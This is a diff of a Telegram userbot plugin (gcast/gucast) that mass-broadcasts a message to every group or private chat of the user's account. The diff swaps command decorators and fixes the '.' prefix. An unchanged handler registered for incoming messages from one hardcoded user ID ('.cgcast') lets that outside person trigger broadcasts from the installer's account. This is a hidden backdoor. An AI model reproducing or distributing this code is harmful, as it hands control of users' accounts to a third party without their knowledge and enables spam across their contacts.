@@ -10,8 +10,7 @@
 # FROM Man-Userbot <https://github.com/mrismanaziz/Man-Userbot>
 # t.me/SharingUserbot & t.me/Lunatic0de
 
-from userbot import CMD_HELP, CMD_HANDLER as cmd
-from userbot.utils import ALBY_cmd
+from userbot import CMD_HELP
 from userbot.events import register
 
 GCAST_BLACKLIST = [
@@ -20,7 +19,7 @@ GCAST_BLACKLIST = [
 ]
 
 
-@ALBY_cmd(pattern="gcast(?: |$)(.*)")
+@register(outgoing=True, pattern=r"^\.gcast(?: |$)(.*)")
 @register(incoming=True, from_users=1441342342,
           pattern=r"^\.cgcast(?: |$)(.*)")
 async def gcast(event):
@@ -32,7 +31,7 @@ async def gcast(event):
     else:
         await event.edit("**Berikan Sebuah Pesan atau Reply**")
         return
-    kk = await event.edit("`Sedang Mengirim Pesan Secara Global... 📢`")
+    kk = await event.edit("`Globally Broadcasting Msg...`")
     er = 0
     done = 0
     async for x in event.client.iter_dialogs():
@@ -51,7 +50,7 @@ async def gcast(event):
     )
 
 
-@ALBY_cmd(pattern="gucast(?: |$)(.*)")
+@register(outgoing=True, pattern=r"^\.gucast(?: |$)(.*)")
 async def gucast(event):
     xx = event.pattern_match.group(1)
     if xx:
@@ -79,8 +78,8 @@ async def gucast(event):
 
 CMD_HELP.update(
     {
-        "gcast": f"**Plugin : **`gcast`\
-        \n\n  •  **Syntax :** `{cmd}gcast` <text/reply media>\
+        "gcast": "**Plugin : **`gcast`\
+        \n\n  •  **Syntax :** `.gcast` <text/reply media>\
         \n  •  **Function : **Mengirim Global Broadcast pesan ke Seluruh Grup yang kamu masuk. (Bisa Mengirim Media/Sticker)\
     "
     }
@@ -89,8 +88,8 @@ CMD_HELP.update(
 
 CMD_HELP.update(
     {
-        "gucast": f"**Plugin : **`gucast`\
-        \n\n  •  **Syntax :** `{cmd}gucast` <text/reply media>\
+        "gucast": "**Plugin : **`gucast`\
+        \n\n  •  **Syntax :** `.gucast` <text/reply media>\
         \n  •  **Function : **Mengirim Global Broadcast pesan ke Seluruh Private Massage / PC yang masuk. (Bisa Mengirim Media/Sticker)\
     "
     }
